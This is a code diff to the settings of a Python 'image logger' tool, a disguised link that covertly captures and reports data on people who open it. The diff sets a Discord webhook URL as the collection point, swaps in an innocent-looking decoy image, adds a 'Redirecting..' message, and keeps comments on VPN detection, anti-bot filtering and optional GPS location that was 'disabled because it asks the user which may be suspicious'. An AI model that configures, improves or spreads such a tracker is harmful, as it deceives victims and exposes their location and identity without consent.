@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335292100950098040/54tcPHReGsf6ntxFzOGeCE5BFp5sQ-2B4HLJSMDnCLs3Vhwy7R86-XEHy4RDCXOBDVZX",
-    "image": "https://www.shutterstock.com/image-photo/young-minded-pensive-sad-chubby-600nw-2345871905.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://codakid.com/wp-content/uploads/2021/02/image7.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": ":( !!", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Redirecting..", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 2, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
